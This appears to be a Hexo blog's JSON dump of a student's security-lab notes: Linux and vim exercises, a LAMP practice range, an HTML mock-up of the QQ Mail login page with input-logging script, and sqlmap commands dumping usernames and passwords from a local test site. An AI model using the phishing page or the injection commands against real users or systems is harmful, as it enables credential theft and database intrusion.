读出来的声音就是百度语音的声音，有些机械化，个人还是比较喜欢小爱同学的语音，说的更有感情。","categories":[],"tags":[]},{"title":"了解钓鱼网站的基本工作原理","slug":"了解钓鱼网站的工作原理","date":"2019-08-17T06:15:54.679Z","updated":"2019-08-24T09:23:33.638Z","comments":true,"path":"2019/08/17/了解钓鱼网站的工作原理/","link":"","permalink":"http://yoursite.com/2019/08/17/了解钓鱼网站的工作原理/","excerpt":"2019/07/23实验笔记（二）","text":"2019/07/23实验笔记（二） 在之前的钓鱼网站页面上添加了关于监听输入框内所输入信息的JS脚本 再在输入框内添加相应的监听器 现在测试一下效果，在用户名的输入框内依次输入：12457 在console下就可以看见输入的内容及顺序 密码输入也是如此，这里我还进行了base64编码","categories":[],"tags":[]},{"title":"html的标签及其含义","slug":"html的标签及含义","date":"2019-08-17T06:09:39.766Z","updated":"2019-08-24T09:23:13.668Z","comments":true,"path":"2019/08/17/html的标签及含义/","link":"","permalink":"http://yoursite.com/2019/08/17/html的标签及含义/","excerpt":"2019/07/23实验笔记（一）收集一些html标签的含义，把他们按照首字母进行排序","text":"2019/07/23实验笔记（一）收集一些html标签的含义，把他们按照首字母进行排序 A: 定义锚。 定义缩写。 定义只取首字母的缩写。 定义文档作者或拥有者的联系信息。 不赞成使用。定义嵌入的 applet。 定义图像映射内部的区域。 定义文章。 定义页面内容之外的内容。 定义声音内容。 B: 定义粗体字。 定义页面中所有链接的默认地址或默认目标。 不赞成使用。定义页面中文本的默认字体、颜色或尺寸。 定义文本的文本方向，使其脱离其周围文本的方向设置。 定义文字方向。 定义大号文本 定义长的引用。 定义文档的主体。 定义简单的折行。 定义按钮 C: 定义图形。 定义表格标题。 不赞成使用。定义居中文本。 定义引用(citation)。 定义计算机代码文本。 定义表格中一个或多个列的属性值。 定义表格中供格式化的列组。 定义命令按钮 D: 定义下拉列表。 定义定义列表中项目的描述。 定义被删除文本。 定义元素的细节。 不赞成使用。定义目录列表。 定义文档中的节。 定义定义项目。 定义对话框或窗口。 定义定义列表。 定义定义列表中的项目。 E: 定义强调文本。 定义外部交互内容或插件。 F: 定义围绕表单中元素的边框。 定义 figure 元素的标题。 定义媒介内容的分组，以及它们的标题。 不赞成使用。定义文字的字体、尺寸和颜色。 定义 section 或 page 的页脚。 定义供用户输入的 HTML 表单。 定义框架集的窗口或框架。 定义框架集。 H: to 定义 HTML 标题。 定义关于文档的信息。 定义 section 或 page 的页眉。 定义水平线。 定义 HTML 文档。 I: 定义斜体字。 定义内联框架。 定义图像。 定义输入控件。 定义被插入文本。 不赞成使用。定义与文档相关的可搜索索引。 K: 定义键盘文本。 定义生成密钥。 L: 定义 input 元素的标注。 定义 fieldset 元素的标题。 定义列表的项目。 定义文档与外部资源的关系。 M: 定义图像映射。 定义有记号的文本。 定义命令的列表或菜单。 定义用户可以从弹出菜单调用的命令/菜单项目。 定义关于 HTML 文档的元信息。 定义预定义范围内的度量。 N: 定义导航链接。 定义针对不支持框架的用户的替代内容。 定义针对不支持客户端脚本的用户的替代内容。 O: 定义内嵌对象。 定义有序列表。 定义选择列表中相关选项的组合。 定义选择列表中的选项。 定义输出的一些类型。 P: 定义段落。 定义对象的参数。 定义预格式文本。 定义任何类型的任务的进度。 Q: 定义短的引用。 R: 定义若浏览器不支持 ruby 元素显示的内容。 定义 ruby 注释的解释。 定义 ruby 注释。 S: 不赞成使用。定义加删除线的文本。 定义计算机代码样本。 定义客户端脚本。 定义 section。 定义选择列表（下拉列表）。 定义小号文本。 定义媒介源。 定义文档中的节。 不赞成使用。定义加删除线文本。 定义强调文本。 定义文档的样式信息。 定义下标文本。 为 元素定义可见的标题。 定义上标文本。 T: 定义表格。 定义表格中的主体内容。 定义表格中的单元。 定义多行的文本输入控件。 定义表格中的表注内容（脚注）。 定义表格中的表头单元格。 定义表格中的表头内容。 定义日期/时间。 定义文档的标题。 定义表格中的行。 定义用在媒体播放器中的文本轨道。 定义打字机文本。 U: 不赞成使用。定义下划线文本。 定义无序列表。 V: 定义文本的变量部分。 定义视频。 W: 定义可能的换行符。 X: 不赞成使用。定义预格式文本","categories":[],"tags":[]},{"title":"搭建实验所需钓鱼网站页面","slug":"试着做一个钓鱼网站的页面","date":"2019-08-17T05:54:51.718Z","updated":"2019-08-17T06:13:45.029Z","comments":true,"path":"2019/08/17/试着做一个钓鱼网站的页面/","link":"","permalink":"http://yoursite.com/2019/08/17/试着做一个钓鱼网站的页面/","excerpt":"2019/07/22实验笔记这里为了体验了解钓鱼网站的运作原理，自己制作了一个钓鱼网站的页面，只是为了学习，虽然丑了点，但还是能用的","text":"2019/07/22实验笔记这里为了体验了解钓鱼网站的运作原理，自己制作了一个钓鱼网站的页面，只是为了学习，虽然丑了点，但还是能用的 下面是一张效果图： &lt;title&gt;登陆QQ邮箱&lt;/title&gt; &lt;style&gt; *{margin: 0,padding: 0;} html,body{ height:100%; width: 100%; } .warp-main{ height: 100%; width: 100%; background: #FFFFFF; z-index: -1; } .top-panel{ background-color: aliceblue; height: 63px; } .top-panel div:first-child{ height: 63px; width:30%; background-color: #F0F8FF ; position: absolute; } .top-panel div:last-child{ height: 63px; width: 70%; background-color: aliceblue; position: absolute; right: 0; } .login-panel{ height: 400px; width: 900px; background-color: #FFFFFF; top: 50%; left: 50%; position: absolute; margin-left: -450px; margin-top: -200px; background-image:url(&apos;https://rescdn.qqmail.com/zh_CN/htmledition/images/tg-chang1ea8a2.png&apos;); background-position:left 0px; background-repeat:no-repeat; } .login-panel&gt;div:first-child{ height: 336px; width:389px; background-color: #FFFFFF; position: absolute; right:10%; top: 8%; border-radius: 5px; border:1px solid #000000 ; } .login-panel&gt;div div{ height: 50px; float: left; width: 50%; text-align: center; margin-top: 15px; } .footer-pannel{ background-color: aliceblue; height: 37px; width: 100%; position: absolute; bottom: 0px; } #u{ height: 40px; width: 284px; position: absolute; margin-left: -45px; } #p{ background-color: #00FFFF; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;warp-main&quot;&gt; &lt;div class=&quot;top-panel&quot;&gt; &lt;div&gt; &lt;img src=&quot;http://ws4.sinaimg.cn/large/0078H38igy1g62mqedut7j306701qdfp.jpg&quot;&gt; &lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;login-panel&quot;&gt; &lt;div&gt; &lt;div&gt; 微信登陆 &lt;/div&gt; &lt;div&gt; QQ登陆 &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;text&quot; class=&quot;inputstyle&quot; id=&quot;u&quot; name=&quot;u&quot; value=&quot;&quot; placeholder=&quot;支持QQ号/邮件/手机号登陆&quot;&gt; &lt;/div&gt; &lt;div&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;text&quot; class=&quot;inputstyle&quot; id=&quot;u&quot; name=&quot;u&quot; value=&quot;&quot; placeholder=&quot;QQ密码&quot;&gt; &lt;/div&gt; &lt;div&gt; &lt;/div&gt; &lt;div style=&quot;height: 1px;&quot;&gt; &lt;input type=&quot;checkbox&quot; value=&quot;&quot;&gt;下次自动登录&lt;/input&gt; &lt;/div&gt; &lt;div style=&quot;height: 1px;&quot;&gt;&lt;/div&gt; &lt;div&gt; &lt;br/&gt; &lt;input type=&quot;button&quot; value=&quot;登陆&quot; name=&quot;p&quot; style=&quot;height:40px;width: 284px;background-color:royalblue;positon: absolute;margin-left: 53px;&quot; &gt;&lt;/button&gt; &lt;/div&gt; &lt;div&gt;&lt;/div&gt; &lt;div style=&quot;width: 100%;&quot;&gt; &lt;a href=&quot;www.baidu.com&quot; style=&quot;text-align: center;text-decoration: none;&quot; &gt;扫码登陆&lt;/a&gt;&lt;br&gt; &lt;a href=&quot;www.baidu.com&quot; style=&quot;float: right;text-decoration: none;&quot;&gt;忘记密码&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp;&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;footer-pannel&quot;&gt; &lt;img src=&quot;http://ws1.sinaimg.cn/large/0078H38igy1g62mqyrqe3j31ha012mx5.jpg&quot; &gt; &lt;/div&gt;","categories":[],"tags":[]},{"title":"搭建实验所需靶场网站","slug":"搭建实验所需靶场网站","date":"2019-08-14T00:55:38.684Z","updated":"2019-08-17T06:14:05.753Z","comments":true,"path":"2019/08/14/搭建实验所需靶场网站/","link":"","permalink":"http://yoursite.com/2019/08/14/搭建实验所需靶场网站/","excerpt":"2019/07/20实验笔记为了之后的SQL注入、xss和数据库的学习，先搭建了靶场环境。","text":"2019/07/20实验笔记为了之后的SQL注入、xss和数据库的学习，先搭建了靶场环境。 l 安装Apache服务器 1、安装、启动Apache服务器 2、关闭防火墙 3、登陆默认网站验证Apache服务器已经安装完成 4、修改默认网站 l 安装DNS服务器 安装和配置DNS服务器 l 安装MySQL数据库 安装和配置数据库 l 安装PHP环境 1、安装PHP环境 2、将php和mysql关联起来 3、安装php模块 4、重启Apache服务器 5、测试 l 通过LAMP环境部署book留言板 1、把book移动到/var/www/html下 2、创建数据库再连接数据库 l 通过LAMP环境部署bss留言板 1、把bss移动到/var/www/html 2、创建数据库再连接数据库 l 通过LAMP环境部署grade留言板 1、把grade移动到/var/www/html 2、创建数据库再连接数据库 任务二Centos7下使用tomcat发布JSP电商网站 1、删除open的java 2、安装oracle的java 3、安装MAVEN、Git、安装mysql相关组件 4、安装Tomcat环境 期间失败了很多次，原因是因为压缩包损坏，多次从新下载包之后得以解决。 5、创建数据库、导入数据库 6、拷贝网站文件、连接数据库、重启Tomcat。 任务三利用shell命令对相关日志和数据库进行定期周期性 成绩评定 周期备份","categories":[],"tags":[]},{"title":"vim练习","slug":"vim操作练习","date":"2019-08-13T07:46:12.673Z","updated":"2019-08-17T06:13:27.027Z","comments":true,"path":"2019/08/13/vim操作练习/","link":"","permalink":"http://yoursite.com/2019/08/13/vim操作练习/","excerpt":"2019/07/21实验笔记（三）使用vim，进行了一些基础练习，稍微熟悉了vim的一些操作","text":"2019/07/21实验笔记（三）使用vim，进行了一些基础练习，稍微熟悉了vim的一些操作 1、请在 /tmp 这个目录下建立一个名为 vitest 的目录； 2、进入 vitest 这个目录当中； 3、将 /etc/enscript.cfg 复制到本目录下； 4、使用 vim打开 enscript.cfg； 5、在vim中设定行号； 6、移动到第 21行，向右移动20个字符，请问你看到光标是什么内容？ 7、移动到第一行，并且向下搜寻一下『 you 』这个字符串，请问他在第几行？ 8、接着下来，我要将 2 到 23 行间『大写 G字符串』改为『小写 g 字符串』，并且 一个一个挑选是否需要修改，如何下达指令？如果在挑选过程中一直按『y』， 结 果会在最后一行出现改变了几个 G 呢？ 9、修改完后，突然反悔了，要全部复原，有哪些方法？ 一直按u或者q！ 10、我要复制 15 到 20 这六行的内容，并且贴到最后一行之后； 先输入15G再输入6yy会出现‘复制了6行’再按G到最后一行，然后按p会‘出现多了6行’ 11、删除21 到 42 行的内容，要如何删除？ 12、将这个档案另存为 man.test.config ； 13、去到第 27 行，并且删除 15 个字符，结果出现的第一个单字是什么？ 14、在第一行前新增一行，该行内容输入『I am a student…』； 先输入1G，再输入大写的O，然后键入内容，再按esc退出插入模式。 15、保存并退出。 ：wq","categories":[],"tags":[]},{"title":"修改权限（chmod）----用户组权限练习","slug":"Linux权限练习","date":"2019-08-13T07:21:13.400Z","updated":"2019-08-17T06:13:32.544Z","comments":true,"path":"2019/08/13/Linux权限练习/","link":"","permalink":"http://yoursite.com/2019/08/13/Linux权限练习/","excerpt":"2019/07/21实验笔记（二）通过修改用户组的权限，达到区分每组人员的权限分配","text":"2019/07/21实验笔记（二）通过修改用户组的权限，达到区分每组人员的权限分配 创建用户组xm1z xm2z glz 添加用户xm11 xm12然后将这两个用户归到xm1z 将xm11设置为xm1z的组管理员 创建用户xm21和xm22并且把他们归到xm2z然后把xm21设为管理员 创建用户xmjl、rsjl、xmzl然后把他们归到glz 创建目录xm1z、xm2z、wan19，把目录xm1z的属组改为xm1z，xm2z和glz同理 设置acl规则使xmjl在目录xm1z和xm2z中有rwx权限 修改三个目录的权限为rw- 把xm1z的属主改为xm11，xm2z同理 这个时候看一下这三个目录的权限 将目录xm1z设置为SBIT和SGID 切换为用户xm11尝试进入xm2z 进入xm1z创建文件xm11和xm11.1 切换为xm12尝试进入xm2z 进入xm1z尝试删除xm11.1和创建xm12 xm21和xm11相同，xm22和xm12相同，不再重复 切换为xmjl尝试进入xm1z和xm2z 尝试在xm2z中创建文件 进入xm1z尝试删除文件","categories":[],"tags":[]},{"title":"一些关于Linux的基础操作练习","slug":"linux操作练习","date":"2019-08-13T07:10:03.193Z","updated":"2019-08-17T06:13:39.345Z","comments":true,"path":"2019/08/13/linux操作练习/","link":"","permalink":"http://yoursite.com/2019/08/13/linux操作练习/","excerpt":"2019/07/19实验笔记（一）练习了一些Linux的操作练习，才好更好的使用Linux，多熟悉熟悉总有好处的","text":"2019/07/19实验笔记（一）练习了一些Linux的操作练习，才好更好的使用Linux，多熟悉熟悉总有好处的 linux操作练习一、根据要求完成以下任务： 2、以root身份登录到Linux系统字符界面，默认的Shell命令提示符为“[root@localhost ~]#”,指出命令提示符中每部分的具体含义。 Root：用户名 localhost：主机名 ~:家目录 3、执行命令查看用户当前所在的目录。 4、显示当前目录下所有文件的详细信息（包含隐藏文件），在Linux系统中，隐藏文件的标识是什么？在显示的文件详细信息中，第1组的第1个字符代表文件类别：- d l c b分别代表是哪种文件的类型？ 隐藏文件以.开头 -表示普通文件，l表示连接，c表示字符设备，b表示块设备 5、显示/etc/inittab文件的详细信息。 6、显示/dev目录中所有以“sd”开头的文件的详细信息。 7、在root用户家目录里创建一个名为test1的目录。 8、在test1目录中创建一个名为temp1的空文件。 9、将文件temp1复制一分进行备份，仍然保存在/root/test1/目录下，备份的文件名为temp1.bak。 10、将文件temp1.bak改名为temp.bak,并将temp.bak移动到/temp/目录下。 11、将/root/test1/目录强制删除。 12、用cat命令查看/etc/sysconfig/network-scripts/ifcfg-eth0文件的内容，注意tab键补齐。 13、分别用more、less命令分屏查看/etc/passwd文件的内容，并说出他们之间的区别。 More向下翻完之后自动退出且只能向下翻。Less可以往后翻也可以往前翻 14、查看/etc/passwd文件的前10行内容。 15、查看/etc/passwd文件的后5行内容。 16、统计/etc目录中扩展名是“.conf”的文件的个数。 17、查找/dev目录中所有”sd”开头的文件。 18、查找/dev 目录以sd开头的文件，将结果保存到/temp/fhttp.file文件中。 # ls -l /dev/sd* &gt; /tmp/fhttp.file 19、在/boot目录中查找大小超过1024KB而且文件名以“init”开头的文件。 20、在/etc/passwd文件中查找包含“root”字符串的行。 21、在/etc/httpd/conf/httpd.conf文件中查找所以“#”开头的行。 22、查找/etc/httpd/conf/httpd.conf文件中不是以“#”开头的行。 23、查找所有属于普通用户student的文件。 24、为/etc/httpd/conf/httpd.conf文件在root用户家目录中创建一个名为httpd的软链接。 25、创建一个名为wcl的命令的别名，完成下列要求。","categories":[],"tags":[]},{"title":"使用sqlmap实现自动注入攻击","slug":"使用sqlmap实现自动注入攻击","date":"2019-08-13T03:10:03.154Z","updated":"2019-08-17T06:13:56.728Z","comments":true,"path":"2019/08/13/使用sqlmap实现自动注入攻击/","link":"","permalink":"http://yoursite.com/2019/08/13/使用sqlmap实现自动注入攻击/","excerpt":"2019/07/21实验笔记这是我第一次使用sqlmap，只能在网上查找攻略，一步一步的学习如何操作，在此记录自己的学习经历","text":"2019/07/21实验笔记这是我第一次使用sqlmap，只能在网上查找攻略，一步一步的学习如何操作，在此记录自己的学习经历 1、检测是否存在SQL注入 Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 2、爆库 Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 –dbs 3、爆表 Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 -D test –tables 4、爆字段 Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 -D test -T user –colums 5、爆数据 Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 -D test -T user -C id,password,username –dump","categories":[],"tags":[]}]}